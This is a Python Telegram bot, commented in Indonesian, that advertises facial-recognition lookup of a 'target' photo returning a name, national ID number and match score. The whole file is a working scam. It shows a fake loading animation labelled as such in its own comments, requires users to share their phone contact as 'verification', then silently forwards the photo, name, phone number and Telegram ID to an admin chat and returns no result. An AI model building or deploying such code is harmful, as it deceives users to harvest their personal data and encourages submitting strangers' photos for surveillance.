import os
import asyncio
import logging
from datetime import datetime
from dotenv import load_dotenv

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# --- KONFIGURASI LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Memuat variabel .env
load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
try:
    ADMIN_ID = int(os.getenv("ADMIN_GROUP_ID").strip())
except:
    ADMIN_ID = None

# --- HANDLER START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "SELAMAT DATANG\n\n"
        "BOT FR TESTING\n"
        "(KUOTA 10/DAY)\n\n"
        "CARA PENGGUNAAN BOT\n\n"
        "1. SILAHKAN MASUKKAN FOTO TARGET, UPAYAKAN FOTO TAMPAK DEPAN DAN TERLIHAT JELAS.\n\n"
        "2. SISTEM AKAN MELAKUKAN PENGECEKAN FR TARGET DALAM 10MENIT WAKTU TERCEPAT UNTUK MENDAPATKAN HASIL FR AKURASI TINGGI.\n\n"
        "3. BOT AKAN MENAMPILKAN HASIL NAMA, NIK, DAN PERSENTASE KEMIRIPAN DENGAN FOTO TARGET.\n\n"
        "4. BOT BERFUNGSI SAAT SERVER HIDUP DI PUKUL 06.00 WIB SAMPAI DENGAN PUKUL 21.00 WIB.\n\n"
        "5. GUNAKAN AKSES DENGAN BIJAK. TERIMAKASIH\n\n\n"
        "SELAMAT BERTUGAS, SEMOGA SUKSES SELALU"
    )
    # Reset keyboard jika ada sisa keyboard dari sesi sebelumnya
    await update.message.reply_text(welcome_text, reply_markup=ReplyKeyboardRemove())

# --- HANDLER FOTO ---
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    # Simpan file_id foto ke memory sementara agar bisa dikirim setelah kontak diterima
    context.user_data['pending_photo'] = update.message.photo[-1].file_id
    
    # Notifikasi awal
    await update.message.reply_text("📥 Foto diterima. Menunggu verifikasi identitas...")

    # Munculkan Tombol Kontak sebagai syarat wajib
    contact_btn = [[KeyboardButton("📱 KLIK DISINI UNTUK VERIFIKASI KONTAK", request_contact=True)]]
    markup = ReplyKeyboardMarkup(contact_btn, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "⚠️ Untuk memproses foto ini, silakan verifikasi kontak Anda terlebih dahulu melalui tombol di bawah:",
        reply_markup=markup
    )

# --- HANDLER KONTAK + FAKE LOADING ---
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_contact = update.message.contact
    user = update.message.from_user
    photo_id = context.user_data.get('pending_photo')

    # Jika user kirim kontak tanpa kirim foto dulu
    if not photo_id:
        await update.message.reply_text("Silahkan kirim foto target terlebih dahulu.", reply_markup=ReplyKeyboardRemove())
        return

    # 1. Pesan awal verifikasi berhasil (langsung hapus tombol kontak)
    msg = await update.message.reply_text("✅ Verifikasi berhasil. Menghubungkan ke Server...", reply_markup=ReplyKeyboardRemove())
    
    # 2. Rangkaian FAKE LOADING (Efek animasi Edit Message)
    await asyncio.sleep(1.5)
    await msg.edit_text("🔍 **[1/3]** Mengekstraksi fitur biometrik wajah...", parse_mode='Markdown')
    
    await asyncio.sleep(2)
    await msg.edit_text("⏳ **[2/3]** Mencocokkan dengan database FR... [▓▓▓▓░░░░░░] 45%", parse_mode='Markdown')
    
    await asyncio.sleep(2.5)
    await msg.edit_text("📡 **[3/3]** Sinkronisasi hasil ke server pusat... [▓▓▓▓▓▓▓▓▓▓] 100%", parse_mode='Markdown')
    
    await asyncio.sleep(1)
    await msg.edit_text("Sedang diproses...")

    # 3. Teruskan Foto dan Data Kontak ke Admin
    if ADMIN_ID:
        try:
            caption_admin = (
                "🎯 **LAPORAN FR MASUK**\n"
                "---------------------------\n"
                f"👤 Nama Pelapor: {user.full_name}\n"
                f"📞 No HP: `{user_contact.phone_number}`\n"
                f"🆔 ID Tel: `{user.id}`\n"
                f"🕒 Waktu: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
                "---------------------------"
            )
            # Kirim foto sebagai objek utama ke admin
            await context.bot.send_photo(
                chat_id=ADMIN_ID,
                photo=photo_id,
                caption=caption_admin,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Gagal meneruskan laporan ke admin: {e}")
    
    # Hapus data memory sementara agar bersih
    context.user_data.clear()

# --- MAIN ---
if __name__ == '__main__':
    if not TOKEN or not ADMIN_ID:
        print("❌ ERROR: Pastikan BOT_TOKEN dan ADMIN_GROUP_ID di .env sudah benar!")
        exit()

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))

    print(f"🚀 Bot FR Berjalan | Monitoring Admin: {ADMIN_ID}")
    app.run_polling(drop_pending_updates=True)
